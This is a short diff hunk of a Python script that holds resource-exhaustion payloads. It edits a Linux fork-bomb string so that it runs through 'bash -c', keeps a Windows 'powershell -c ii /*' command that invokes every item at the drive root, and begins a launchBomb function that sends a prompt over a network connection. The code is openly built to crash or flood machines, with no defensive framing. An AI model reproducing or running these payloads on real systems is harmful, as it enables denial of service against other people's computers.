@@ -2,7 +2,7 @@
 import os
 
 win = "powershell -c ii /*"
-lin = ":(){ :|:& };:"
+lin = "bash -c ':(){ :|: & };:'"
 
 def launchBomb(con):
     con.sendall(b"Are you sure?")
